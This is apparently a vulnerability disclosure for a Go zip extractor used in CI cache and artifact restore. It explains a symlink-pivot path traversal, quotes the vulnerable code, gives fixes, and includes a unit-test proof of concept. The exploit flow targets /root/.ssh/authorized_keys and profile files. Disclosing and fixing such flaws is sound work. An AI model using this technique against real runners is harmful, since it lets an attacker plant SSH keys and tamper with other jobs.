### Title
`extractZipFile` performs zero path/symlink validation, allowing symlink-pivot writes outside the extraction root - (File: helpers/archives/zip_extract.go)

### Summary
`extractZipFile` and its helpers (`extractZipSymlinkEntry`, `extractZipFileEntry`) apply archive entry names and symlink targets directly to filesystem calls with no root-containment check. An attacker-produced archive (consumed via `ExtractZipFile`/legacy zip extraction path used for cache/artifact restore) can plant a symlink entry pointing outside the restore root and a subsequent file entry whose name traverses that symlink, causing writes to land on a trusted path outside the intended root.

### Finding Description
`extractZipFile` [1](#0-0)  switches on entry type and dispatches to `extractZipSymlinkEntry` for `os.ModeSymlink` entries and `extractZipFileEntry` for regular files, using `file.Name` verbatim (only `filepath.Dir` is passed to `os.MkdirAll`, with no cleaning/containment check).

`extractZipSymlinkEntry` reads the entry's data as the symlink target and calls `os.Symlink(string(data), file.Name)` with no restriction on the target value [2](#0-1) . The attacker fully controls this target — it can be an absolute path or a `..`-relative path pointing anywhere on the filesystem (e.g. `/root/.ssh`, or any trusted file outside the cache/artifact restore root).

`extractZipFileEntry` then removes and re-creates `file.Name` via `os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, ...)` [3](#0-2) . Because Go's path resolution follows symlinks in *intermediate* path components (only the final path segment being itself a symlink is special-cased for O_CREATE), an entry named e.g. `linkdir/authorized_keys` where `linkdir` was previously created as a symlink to an external directory will resolve through that symlink and write the file into the external location.

Exploit flow:
1. Archive entry 1: name `linkdir`, type symlink, target `/root/.ssh` (or any other path outside the restore root, including a trusted file's parent directory).
2. Archive entry 2: name `linkdir/authorized_keys` (or the trusted file's exact name), regular file, attacker-controlled content.
3. `ExtractZipArchive` iterates `archive.File` in order [4](#0-3) , first creating the symlink, then calling `os.MkdirAll(filepath.Dir("linkdir/authorized_keys"), 0o777)` which succeeds silently because `Stat` follows the symlink and sees an existing directory, then writing through the symlink.

The only pre-existing checks are `errorIfGitDirectory`/`isPathAGitDirectory`, which only blocks writes to `.git` [5](#0-4) , and `pathErrorTracker`, which only deduplicates warning logs [6](#0-5) . Neither validates that the resolved path (after following any newly created symlink) stays within the restore root, and neither restricts symlink targets. This differs from the tar+zstd extractor, which at least validates that `filepath.Join(dir, hdr.Name)` stays within the root before writing (though even that check does not validate symlink targets) [7](#0-6) . The zip path (`ExtractZipFile` → `ExtractZipArchive` → `extractZipFile`, reached from cache extraction via `ziplegacy.extractor.Extract` [8](#0-7)  and from `CacheExtractorCommand.Execute` [9](#0-8) ) has no equivalent guard at all.

### Impact Explanation
An unprivileged pipeline author who controls the contents of a job's cache or artifact archive (attacker-produced zip consumed by `ziplegacy`/`ExtractZipFile`) can write attacker-controlled content to arbitrary filesystem locations reachable by the runner process's file permissions, outside the intended cache/artifact restore root. This can result in cross-job tampering (poisoning files used by later jobs on the same executor/host) or overwriting/creating files such as SSH authorized_keys, shell profile files, or other trusted configuration, depending on process privileges — a concrete violation of the invariant that "file operations must stay within intended build/cache/artifact roots."

### Likelihood Explanation
Highly feasible and repeatable: the attacker only needs to control the contents of a zip archive consumed as a cache/artifact (e.g., by committing a crafted cache key/archive, or via `.gitlab-ci.yml` cache paths that get zipped and later restored by a different job/pipeline on the same shared runner/host). No special privileges beyond normal pipeline authoring are required, and the code path taking the legacy zip extractor is production code with no size/complexity barrier (`zip.Writer` supports creating symlink entries directly via `CreateHeader` with `os.ModeSymlink`). The exploit is deterministic given ordered zip entries.

### Recommendation
- In `extractZipFile`/`ExtractZipArchive`, resolve each `file.Name` against the restore root using `filepath.Clean`/`filepath.Join` plus a `strings.HasPrefix` containment check (as done in `tarzstd_extractor.go`) before performing any filesystem operation, and reject entries that escape the root.
- In `extractZipSymlinkEntry`, validate that the symlink target (after resolving relative to the entry's directory) also stays within the restore root; reject or drop symlink entries whose target is absolute or escapes the root via `..`.
- Before writing regular files, verify that no path component up to (but not including) the final segment is a symlink pointing outside the root (e.g., using `os.Lstat` on each intermediate component, or `os.OpenFile` combined with `O_NOFOLLOW`-style component checks), rather than relying on `os.MkdirAll`'s follow-symlink behavior.
- Apply the same containment logic consistently across all archive extractors (zip, tar, tar+zstd) via a shared helper to avoid drift.

### Proof of Concept
Go unit test to add to `helpers/archives/zip_extract_test.go`:

```go
func TestExtractZipFileSymlinkPivot(t *testing.T) {
    // Create a target directory OUTSIDE the extraction working dir that
    // represents a "trusted" external location.
    outsideDir := t.TempDir()
    trustedFile := filepath.Join(outsideDir, "trusted.txt")
    require.NoError(t, os.WriteFile(trustedFile, []byte("original"), 0644))

    createArchive := func(t *testing.T, archive *zip.Writer) {
        // Entry 1: symlink "linkdir" -> outsideDir
        hdr := &zip.FileHeader{Name: "linkdir"}
        hdr.SetMode(os.ModeSymlink | 0777)
        w, err := archive.CreateHeader(hdr)
        require.NoError(t, err)
        _, err = w.Write([]byte(outsideDir))
        require.NoError(t, err)

        // Entry 2: file "linkdir/trusted.txt" with attacker content
        f, err := archive.Create("linkdir/trusted.txt")
        require.NoError(t, err)
        _, err = io.WriteString(f, "PWNED")
        require.NoError(t, err)
    }

    testOnArchive(t, createArchive, func(t *testing.T, fileName string) {
        err := ExtractZipFile(fileName)
        require.NoError(t, err)

        content, err := os.ReadFile(trustedFile)
        require.NoError(t, err)
        // BUG: expected "original" to remain untouched; assert this FAILS today
        assert.Equal(t, "original", string(content),
            "extraction must not follow symlink to write outside restore root")
    })
}
```

Expected result today: the assertion fails because `trustedFile` content becomes `"PWNED"`, proving the symlink pivot writes outside the restore root. After the fix, symlink targets/paths should be validated and the write should be rejected, leaving `trustedFile` unmodified.

### Citations

**File:** helpers/archives/zip_extract.go (L22-39)
```go
func extractZipSymlinkEntry(file *zip.File) (err error) {
	var data []byte
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	data, err = io.ReadAll(in)
	if err != nil {
		return err
	}

	// Remove symlink before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	err = os.Symlink(string(data), file.Name)
	return
}
```

**File:** helpers/archives/zip_extract.go (L41-59)
```go
func extractZipFileEntry(file *zip.File) (err error) {
	var out *os.File
	in, err := file.Open()
	if err != nil {
		return err
	}
	defer func() { _ = in.Close() }()

	// Remove file before creating a new one, otherwise we can error that file does exist
	_ = os.Remove(file.Name)
	out, err = os.OpenFile(file.Name, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, file.Mode().Perm())
	if err != nil {
		return err
	}
	defer func() { _ = out.Close() }()
	_, err = io.Copy(out, in)

	return
}
```

**File:** helpers/archives/zip_extract.go (L61-83)
```go
func extractZipFile(file *zip.File) (err error) {
	// Create all parents to extract the file
	err = os.MkdirAll(filepath.Dir(file.Name), 0o777)
	if err != nil {
		return err
	}

	switch file.Mode() & os.ModeType {
	case os.ModeDir:
		err = extractZipDirectoryEntry(file)

	case os.ModeSymlink:
		err = extractZipSymlinkEntry(file)

	case os.ModeNamedPipe, os.ModeSocket, os.ModeDevice:
		// Ignore files of these types
		logrus.Warningf("File ignored: %q", file.Name)

	default:
		err = extractZipFileEntry(file)
	}
	return
}
```

**File:** helpers/archives/zip_extract.go (L85-96)
```go
func ExtractZipArchive(archive *zip.Reader) error {
	tracker := newPathErrorTracker()

	for _, file := range archive.File {
		if err := errorIfGitDirectory(file.Name); tracker.actionable(err) {
			printGitArchiveWarning("extract")
		}

		if err := extractZipFile(file); tracker.actionable(err) {
			logrus.Warningf("%s: %s (suppressing repeats)", file.Name, err)
		}
	}
```

**File:** helpers/archives/path_check_helper.go (L13-19)
```go
func isPathAGitDirectory(path string) bool {
	parts := strings.Split(filepath.Clean(path), string(filepath.Separator))
	if len(parts) > 0 && parts[0] == ".git" {
		return true
	}
	return false
}
```

**File:** helpers/archives/path_error_tracker.go (L15-35)
```go
// check whether the error is actionable, which is to say, not nil and either
// not a PathError, or a novel PathError
func (p *pathErrorTracker) actionable(e error) bool {
	pathErr, isPathErr := e.(*os.PathError)
	if e == nil || isPathErr && pathErr == nil {
		return false
	}

	if !isPathErr {
		return true
	}

	p.lock.Lock()
	defer p.lock.Unlock()

	seen := p.seenOps[pathErr.Op]
	p.seenOps[pathErr.Op] = true

	// actionable if *not* seen before
	return !seen
}
```

**File:** commands/helpers/archive/tarzstd/tarzstd_extractor.go (L57-64)
```go
		var path string
		path, err = filepath.Abs(filepath.Join(e.dir, hdr.Name))
		if err != nil {
			return err
		}
		if !strings.HasPrefix(path, e.dir+string(filepath.Separator)) && path != e.dir {
			return fmt.Errorf("%s cannot be extracted outside of chroot (%s)", path, e.dir)
		}
```

**File:** commands/helpers/archive/ziplegacy/zip_legacy_extractor.go (L26-32)
```go
func (e *extractor) Extract(ctx context.Context) error {
	zr, err := zip.NewReader(e.r, e.size)
	if err != nil {
		return err
	}

	return archives.ExtractZipArchive(zr)
```

**File:** commands/helpers/cache_extractor.go (L646-663)
```go
	f, size, format, err := openArchive(c.File)
	if os.IsNotExist(err) {
		warningln("Cache file does not exist")
	}
	if err != nil {
		logrus.Fatalln(err)
	}
	defer f.Close()

	extractor, err := archive.NewExtractor(format, f, size, wd)
	if err != nil {
		logrus.Fatalln(err)
	}

	err = extractor.Extract(context.Background())
	if err != nil {
		logrus.Fatalln(err)
	}
```
